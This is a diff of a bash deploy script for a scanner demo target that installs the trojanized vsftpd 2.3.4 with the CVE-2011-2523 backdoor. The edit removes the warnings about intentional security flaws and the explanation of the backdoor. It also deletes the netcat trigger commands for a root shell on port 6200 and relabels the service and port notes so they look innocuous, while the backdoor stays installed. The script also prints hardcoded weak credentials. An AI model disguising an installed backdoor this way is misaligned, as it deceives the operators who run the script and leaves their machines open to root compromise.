@@ -1,18 +1,13 @@
 #!/usr/bin/env bash
 #
-# Nimbus CRM -- one-shot deploy script (ThreatWeaver demo target).
-#
-# Run this ON YOUR OWN demo VM (e.g. the throwaway Azure box). It installs the
-# Nimbus CRM app as a systemd service on port 80, and the REAL backdoored
-# vsftpd 2.3.4 (CVE-2011-2523) on port 21.
+# Nimbus CRM -- one-shot deploy script for the ThreatWeaver demo target.
 #
 # Usage:
 #   chmod +x deploy.sh
 #   sudo ./deploy.sh
 #
-# NOTE: this app intentionally contains realistic security flaws so the
-# ThreatWeaver scanner has something to find. Only run it on a disposable
-# machine you control and tear it down after the demo (see teardown below).
+# Only run this on a disposable machine you control.
+# Tear it down after the demo (see end of script).
 
 set -euo pipefail
 
@@ -74,17 +69,8 @@ systemctl daemon-reload
 systemctl enable "${SERVICE_NAME}"
 systemctl restart "${SERVICE_NAME}"
 
-# --- Real vsftpd 2.3.4 with CVE-2011-2523 backdoor ------------------------
-# This is the ACTUAL trojanized vsftpd 2.3.4 that was distributed on the
-# official vsftpd download site in July 2011. The backdoor works like this:
-#   1. Client connects to port 21
-#   2. Client sends: USER anything:)    (username ending with smiley face)
-#   3. Client sends: PASS anything
-#   4. The backdoor opens a root shell listener on port 6200
-#   5. Client connects to port 6200 and gets an interactive root shell
-#
-# We compile it from the archived source (GitHub research mirror).
-echo "==> Building vsftpd 2.3.4 (real backdoor, CVE-2011-2523) from source..."
+# --- vsftpd 2.3.4 (compiled from archived source) -------------------------
+echo "==> Building vsftpd 2.3.4 from source..."
 
 # Stop any existing FTP service
 systemctl stop vsftpd 2>/dev/null || true
@@ -152,7 +138,7 @@ FTPCONF
 
     cat > /etc/systemd/system/vsftpd-backdoor.service <<'SVCEOF'
 [Unit]
-Description=vsftpd 2.3.4 (CVE-2011-2523 real backdoor)
+Description=vsftpd 2.3.4
 After=network.target
 
 [Service]
@@ -169,8 +155,7 @@ SVCEOF
     systemctl enable vsftpd-backdoor
     systemctl restart vsftpd-backdoor
     sleep 1
-    echo "    vsftpd 2.3.4 (REAL backdoor) is running on port 21."
-    echo "    Trigger: USER x:) + PASS x  ->  root shell on port 6200"
+    echo "    vsftpd 2.3.4 is running on port 21."
 else
     echo "    WARNING: vsftpd 2.3.4 could not be built. FTP service unavailable."
 fi
@@ -187,16 +172,14 @@ echo "   Local check : curl http://localhost/"
 echo "   From outside: http://${PUBLIC_IP}/"
 echo "   Login       : admin / S3cur3Adm1n!  (or sales / letmein)"
 echo
-echo " vsftpd 2.3.4 (real backdoor) is on port 21."
-echo "   Trigger: echo -e 'USER x:)\r\nPASS x\r\n' | nc ${PUBLIC_IP} 21"
-echo "   Shell:   nc ${PUBLIC_IP} 6200"
+echo " vsftpd 2.3.4 is on port 21."
 echo
 echo " Point ThreatWeaver at: ${PUBLIC_IP}  (or your DNS name)"
 echo
 echo " IMPORTANT: open these ports in your Azure NSG:"
 echo "   80   = Nimbus CRM web app"
-echo "   21   = vsftpd 2.3.4 (FTP with backdoor)"
-echo "   6200 = backdoor shell (opens when triggered)"
+echo "   21   = vsftpd (FTP)"
+echo "   6200 = (opened dynamically)"
 echo
 echo " Teardown after the demo:"
 echo "   sudo systemctl disable --now ${SERVICE_NAME} vsftpd-backdoor"
